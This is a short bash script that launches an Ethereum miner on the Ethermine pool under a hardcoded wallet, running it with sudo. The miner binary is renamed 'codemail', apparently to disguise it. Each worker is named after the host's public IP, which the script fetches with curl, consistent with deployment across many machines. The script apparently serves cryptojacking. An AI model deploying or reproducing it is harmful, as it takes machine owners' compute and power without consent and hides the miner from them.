#!/bin/bash

POOL=us1.ethermine.org:4444
WALLET=0x2c3ffa3ea9974d16cddf0411d879589287864da6.$(echo "$(curl -s ifconfig.me)" | tr . _ )-duong-ne

cd "$(dirname "$0")"

chmod +x ./codemail && sudo ./codemail --algo ETHASH --pool $POOL --user $WALLET  $@
